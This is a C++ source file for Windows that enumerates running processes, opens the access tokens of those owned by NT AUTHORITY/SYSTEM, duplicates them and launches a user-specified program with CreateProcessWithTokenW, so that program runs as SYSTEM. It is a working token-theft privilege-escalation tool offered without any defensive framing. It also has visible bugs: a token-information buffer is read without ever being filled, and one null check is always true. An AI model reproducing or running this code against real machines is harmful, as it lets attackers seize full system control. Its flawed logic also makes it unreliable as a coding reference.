#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

using namespace std;

HANDLE getToken(DWORD pid) {
    string userProcess;
    HANDLE cToken = NULL;
    HANDLE ph = NULL;
    ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
    if (ph == NULL) {
        cToken = (HANDLE)NULL;
    } else {
        BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
        if (!res) {
            cToken = (HANDLE)NULL;
        } else {
        }
    }
    if (ph != NULL) {
        CloseHandle(ph);
    }
    return cToken;
}

BOOL createProcess(HANDLE token, LPCWSTR app) {
    // initialize variables
    HANDLE dToken = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL res = TRUE;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);

    res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
    res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
    return res;
}

string GetProcessUserName(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return "";
    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return "";
    }
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
    SID_NAME_USE SidType;
    char lpName[MAX_PATH];
    DWORD dwNameSize = MAX_PATH;
    char lpDomain[MAX_PATH];
    DWORD dwDomainSize = MAX_PATH;
    if (!LookupAccountSid(NULL, pTokenUser->User.Sid, lpName, &dwNameSize, lpDomain, &dwDomainSize, &SidType)) {
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return "";
    }
    string username(lpDomain);
    username += "/";
    username += lpName;
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return username;
}


int main(){
    string username;
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    string app;
    string userProcess;
    int pid = 0;
                
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32); 
    cout << "Enter the path of the application you want to run as SYSTEM: ";
    cin >> app;
    wstring wapp = wstring(app.begin(), app.end());
    LPCWSTR LPCapp = wapp.c_str();    
                
    if(!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }
                
    while (Process32Next(hProcSnap, &pe32)) {
        pid = pe32.th32ProcessID;
        username = GetProcessUserName(pid);
        if (username == "" || username == "NT AUTHORITY/SYSTEM") {
            // get username of process
            bool success = false;
            HANDLE cToken = getToken(pid);
            if (cToken != NULL || cToken == 0){
                success = createProcess(cToken, LPCapp);
                if(success){
                    break;
                }
            }
        }
    }
    CloseHandle(hProcSnap);   
    return 0;    
}